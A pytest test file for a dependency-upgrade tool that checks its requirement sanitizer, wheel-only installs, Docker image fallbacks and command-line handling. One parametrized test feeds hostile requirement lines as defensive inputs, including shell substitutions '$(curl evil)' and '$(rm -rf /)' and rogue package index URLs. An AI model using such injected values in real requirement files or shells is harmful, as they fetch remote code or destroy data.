"""`upkeep fix --from/--to`: automatic setup. The networked dependency step must stay narrow and honest."""

import json
from pathlib import Path

import pytest

from tests.test_agent import FIX, Scripted, tc
from tests.test_cli_fix import build
from upkeep import autoprep, cli
from upkeep.autoprep import PrepareError, Prepared, prepare_upgrade, repo_requirements
from upkeep.sandbox import TestResult


def repo_with(tmp_path, text):
    r = tmp_path / "r"
    r.mkdir(exist_ok=True)
    (r / "requirements.txt").write_text(text)
    return r


# ---------------------------------------------------------------- what may reach pip
def test_plain_requirements_are_kept_and_the_upgraded_library_is_left_out(tmp_path):
    r = repo_with(tmp_path, "requests==2.28.1\nFlask>=2,<3\nJinja2[i18n]==3.0.3\nsix\nPyYAML==5.4.1\npyyaml_extra==1\n")
    ok, notes = repo_requirements(r, "pyyaml")
    assert ok == ["requests==2.28.1", "Flask>=2,<3", "Jinja2[i18n]==3.0.3", "six", "pyyaml_extra==1"] and notes == []


@pytest.mark.parametrize("line", [
    "--index-url http://evil.example/simple", "--extra-index-url=http://evil.example", "git+https://github.com/a/b.git",
    "https://evil.example/pkg.whl", "./local_pkg", "../elsewhere", "/abs/path", "-e .", "pkg @ https://evil.example/x.whl",
    "name==1.0 --install-option=--prefix=/x", "a b c", "$(curl evil)", "pkg==1.0; $(rm -rf /)",
])
def test_anything_that_is_not_a_plain_name_and_version_spec_never_reaches_pip(tmp_path, line):
    ok, _ = repo_requirements(repo_with(tmp_path, line + "\nsafe==1.0\n"), "x")
    assert set(ok) <= {"safe==1.0", "pkg==1.0", "name==1.0"}          # a trailing option is cut off; the plain spec may remain
    assert not any(c in " ".join(ok) for c in ("--", "://", "$(", "./", "/abs"))


def test_environment_markers_are_dropped_not_passed_on(tmp_path):
    ok, _ = repo_requirements(repo_with(tmp_path, "colorama==0.4; sys_platform == 'win32'\n"), "x")
    assert ok == ["colorama==0.4"]


def test_the_requirement_list_is_capped(tmp_path):
    ok, notes = repo_requirements(repo_with(tmp_path, "\n".join(f"pkg{i}==1.0" for i in range(120))), "x")
    assert len(ok) == autoprep.MAX_REQUIREMENTS and any("beyond the first" in n for n in notes)


def test_dependency_folders_are_keyed_by_image_and_contents(tmp_path):
    a = autoprep._deps_dir(tmp_path, "python:3.12-slim", ["pytest", "lib==1"])
    assert a == autoprep._deps_dir(tmp_path, "python:3.12-slim", ["lib==1", "pytest"])
    assert a != autoprep._deps_dir(tmp_path, "python:3.11-slim", ["pytest", "lib==1"])
    assert a != autoprep._deps_dir(tmp_path, "python:3.12-slim", ["pytest", "lib==2"])


# ---------------------------------------------------------------- the preparation flow
@pytest.fixture
def fake_world(monkeypatch, tmp_path):
    old, new = tmp_path / "pypi" / "lib-1.0", tmp_path / "pypi" / "lib-2.0"
    for d in (old, new):
        (d / "lib").mkdir(parents=True)
        (d / "lib" / "__init__.py").write_text("def f():\n    pass\n")
    (new / "CHANGES.rst").write_text("Version 2.0\n-----------\n\n- f() lost its argument.\n")
    monkeypatch.setattr(autoprep, "sources_for", lambda dist, o, n, module=None, cache=None, max_bytes=None: (old, new, module or "lib"))
    monkeypatch.setattr(autoprep, "fetch_sdist", lambda dist, v, cache=None, max_bytes=None: new)
    return tmp_path


class Installer:
    def __init__(self, fail_images=(), fail_wheels=False):
        self.calls, self.fail_images, self.fail_wheels = [], set(fail_images), fail_wheels

    def __call__(self, repo, deps, packages, image="", wheels_only=False, **kw):
        self.calls.append((image, wheels_only, tuple(packages)))
        deps.mkdir(parents=True, exist_ok=True)
        if image in self.fail_images or (self.fail_wheels and wheels_only):
            return TestResult(False, 1, "ERROR: no matching distribution", "docker")
        (deps / "installed.txt").write_text("ok")
        return TestResult(True, 0, "", "docker")


def run(fake_world, installer, **kw):
    repo = repo_with(fake_world, "requests==2.28.1\n")
    return prepare_upgrade(repo, "Lib", "1.0", "2.0", cache=fake_world / "cache", installer=installer, log=lambda s: None, **kw)


def test_it_prepares_sources_release_notes_and_one_dependency_folder_per_version(fake_world):
    inst = Installer()
    prep = run(fake_world, inst)
    assert prep.image == "python:3.12-slim" and prep.module == "lib" and prep.deps_old != prep.deps_new
    assert "Version 2.0" in prep.changelog.read_text()
    assert [c[2] for c in inst.calls] == [("pytest", "coverage", "requests==2.28.1", "Lib==1.0"),
                                          ("pytest", "coverage", "requests==2.28.1", "Lib==2.0")]
    assert all(c[1] is True for c in inst.calls)                         # wheels only: no build scripts


def test_a_second_run_reuses_the_dependency_folders(fake_world):
    run(fake_world, Installer())
    again = Installer()
    run(fake_world, again)
    assert again.calls == []


def test_it_falls_back_to_older_python_images_until_wheels_exist(fake_world):
    inst = Installer(fail_images={"python:3.12-slim", "python:3.11-slim"})
    prep = run(fake_world, inst)
    assert prep.image == "python:3.10-slim"
    assert [c[0] for c in inst.calls if c[2][-1] == "Lib==1.0"] == ["python:3.12-slim", "python:3.11-slim", "python:3.10-slim"]


def test_failed_installs_leave_no_half_installed_folder_behind(fake_world):
    with pytest.raises(PrepareError):
        run(fake_world, Installer(fail_images=set(autoprep.IMAGES)))
    assert not [p for p in (fake_world / "cache" / "deps").glob("*") if not p.name.startswith(".scratch")]


def test_building_from_source_needs_an_explicit_flag(fake_world):
    with pytest.raises(PrepareError, match="--allow-source-builds"):
        run(fake_world, Installer(fail_wheels=True))
    inst = Installer(fail_wheels=True)
    prep = run(fake_world, inst, allow_source_builds=True)
    assert prep.image == "python:3.12-slim" and any(c[1] is False for c in inst.calls)


def test_an_explicit_image_is_the_only_one_tried(fake_world):
    inst = Installer(fail_images={"python:3.9-slim"})
    with pytest.raises(PrepareError):
        run(fake_world, inst, image="python:3.9-slim")
    assert {c[0] for c in inst.calls} == {"python:3.9-slim"}


def test_download_failures_become_a_clear_prepare_error(monkeypatch, fake_world):
    def boom(*a, **k):
        raise autoprep.PyPIError("HTTP 404 for https://pypi.org/x (not found on PyPI)")
    monkeypatch.setattr(autoprep, "sources_for", boom)
    with pytest.raises(PrepareError, match="not found on PyPI"):
        run(fake_world, Installer())


# ---------------------------------------------------------------- the command line
def fix_args(repo, out, *extra):
    return ["fix", "--repo", str(repo), "--package", "Lib", "--out", str(out), "--test-backend", "local", "--unsandboxed", *extra]


def test_old_without_new_or_versions_is_a_usage_error(tmp_path, capsys):
    old, new, repo = build(tmp_path)
    assert cli.main(fix_args(repo, tmp_path / "o", "--old", str(old)), client=Scripted([])) == 2
    assert "--old and --new go together" in capsys.readouterr().err
    assert cli.main(fix_args(repo, tmp_path / "o", "--from", "1.0"), client=Scripted([])) == 2
    assert "--from and --to" in capsys.readouterr().err
    assert cli.main(fix_args(repo, tmp_path / "o", "--old", str(old), "--new", str(new), "--from", "1.0", "--to", "2.0"), client=Scripted([])) == 2
    assert "not both" in capsys.readouterr().err


def test_docker_must_be_running_for_the_automatic_path(tmp_path, monkeypatch, capsys):
    _, _, repo = build(tmp_path)
    monkeypatch.setattr(cli, "docker_ready", lambda: False)
    code = cli.main(["fix", "--repo", str(repo), "--package", "Lib", "--from", "1.0", "--to", "2.0", "--out", str(tmp_path / "o")], client=Scripted([]))
    assert code == 2 and "Docker is not running" in capsys.readouterr().err


def test_a_failed_preparation_exits_3_with_the_reason(tmp_path, monkeypatch, capsys):
    _, _, repo = build(tmp_path)

    def fail(*a, **k):
        raise PrepareError("could not install the dependencies from wheels on python:3.12-slim")
    monkeypatch.setattr(cli, "prepare_upgrade", fail)
    assert cli.main(fix_args(repo, tmp_path / "o", "--from", "1.0", "--to", "2.0"), client=Scripted([])) == 3
    assert "could not install" in capsys.readouterr().err


def test_from_to_runs_the_whole_flow_with_the_behavior_check_on_by_default(tmp_path, monkeypatch):
    old, new, repo = build(tmp_path)
    seen = {}

    def fake_prepare(repo_, dist, a, b, module, image, allow_source_builds=False, **k):
        seen.update(dist=dist, a=a, b=b, module=module, allow=allow_source_builds)
        return Prepared(old, new, "lib", None, old, new, "python:3.9-slim", [])
    monkeypatch.setattr(cli, "prepare_upgrade", fake_prepare)
    out = tmp_path / "o"
    model = Scripted([[FIX], [tc("finish", {"status": "fixed", "summary": "x"})]])
    code = cli.main(fix_args(repo, out, "--from", "1.0", "--to", "2.0", "--allow-source-builds"), client=model)
    assert code == 0 and seen == {"dist": "Lib", "a": "1.0", "b": "2.0", "module": None, "allow": True}
    proof = (out / "PROOF.md").read_text()
    assert "lib 1.0 -> 2.0" in proof and "## Behavior check" in proof and "not run" not in proof.split("## Behavior check")[1].split("##")[0]
    assert json.loads((out / "result.json").read_text())["status"] == "verified"


def test_no_behavior_check_flag_turns_it_off(tmp_path, monkeypatch):
    old, new, repo = build(tmp_path)
    monkeypatch.setattr(cli, "prepare_upgrade", lambda *a, **k: Prepared(old, new, "lib", None, old, new, "python:3.9-slim", []))
    out = tmp_path / "o"
    model = Scripted([[FIX], [tc("finish", {"status": "fixed", "summary": "x"})]])
    cli.main(fix_args(repo, out, "--from", "1.0", "--to", "2.0", "--no-behavior-check"), client=model)
    assert "not run (only the repo's own tests" in (out / "PROOF.md").read_text()


def test_the_failure_message_shows_pips_error_lines_not_its_chatter():
    out = ("ERROR: Ignored the following versions that require a different python version: 1.2.0 Requires-Python >=3.10\n"
           "ERROR: Could not find a version that satisfies the requirement pycrypto==2.6.1 (from versions: none)\n"
           "ERROR: No matching distribution found for pycrypto==2.6.1\n\n[notice] A new release of pip is available: 23.0.1 -> 26.0.1\n")
    got = autoprep.pip_errors(out)
    assert "pycrypto==2.6.1" in got and "notice" not in got and "Ignored" not in got and got.count("\n") == 1
    assert autoprep.pip_errors("something odd happened") == "something odd happened"


def test_a_pin_that_cannot_be_installed_ends_in_a_prepare_error_that_names_it(fake_world):
    class Fails(Installer):
        def __call__(self, repo, deps, packages, image="", wheels_only=False, **kw):
            deps.mkdir(parents=True, exist_ok=True)
            return TestResult(False, 1, "ERROR: Could not find a version that satisfies the requirement pycrypto==2.6.1\n[notice] pip", "docker")
    with pytest.raises(PrepareError, match="pycrypto==2.6.1") as e:
        run(fake_world, Fails())
    assert "[notice]" not in str(e.value) and "--allow-source-builds" in str(e.value)


def test_minimal_deps_keeps_only_the_requirements_the_code_imports(tmp_path):
    r = repo_with(tmp_path, "requests==2.28.1\nnumpy==1.26.0\npython-dateutil==2.8.2\nPillow==10.0.0\nscikit-learn==1.3.0\nunused-thing==1.0\nPyYAML==5.4.1\n")
    (r / "app.py").write_text("import requests\nfrom dateutil import parser\nimport PIL.Image\nimport yaml\n")
    (r / "pkg").mkdir()
    (r / "pkg" / "m.py").write_text("from sklearn.linear_model import Ridge\n")
    full, _ = repo_requirements(r, "PyYAML")
    mini, notes = repo_requirements(r, "PyYAML", only_imported=True)
    assert len(full) == 6
    assert mini == ["requests==2.28.1", "python-dateutil==2.8.2", "Pillow==10.0.0", "scikit-learn==1.3.0"]   # numpy and unused-thing dropped
    assert any("minimal dependencies: installing 4 of 6" in n for n in notes)


def test_imports_are_read_without_running_anything_and_odd_files_are_skipped(tmp_path):
    (tmp_path / "ok.py").write_text("import os, json\nfrom flask import Flask\nfrom . import sibling\n")
    (tmp_path / "bad.py").write_text("def broken(:\n")
    (tmp_path / "sneaky.py").write_text("import evil_module\nopen('SHOULD_NOT_EXIST', 'w')\n")
    assert autoprep.imported_roots(tmp_path) >= {"os", "json", "flask", "evil_module"}
    assert not (tmp_path / "SHOULD_NOT_EXIST").exists()


@pytest.mark.parametrize("req,imports", [("python-dateutil", "dateutil"), ("PyYAML", "yaml"), ("beautifulsoup4", "bs4"), ("Pillow", "pil"),
                                         ("msgpack-python", "msgpack"), ("typing_extensions", "typing_extensions"), ("some-pkg", "some_pkg")])
def test_import_names_cover_the_common_oddities(req, imports):
    assert imports in autoprep.import_names(req)


def test_the_cli_flag_reaches_the_preparation(tmp_path, monkeypatch):
    old, new, repo = build(tmp_path)
    seen = {}

    def fake(repo_, dist, a, b, module, image, **k):
        seen.update(k)
        return Prepared(old, new, "lib", None, old, new, "python:3.9-slim", [])
    monkeypatch.setattr(cli, "prepare_upgrade", fake)
    model = Scripted([[FIX], [tc("finish", {"status": "fixed", "summary": "x"})]])
    cli.main(fix_args(repo, tmp_path / "o", "--from", "1.0", "--to", "2.0", "--minimal-deps"), client=model)
    assert seen["only_imported"] is True
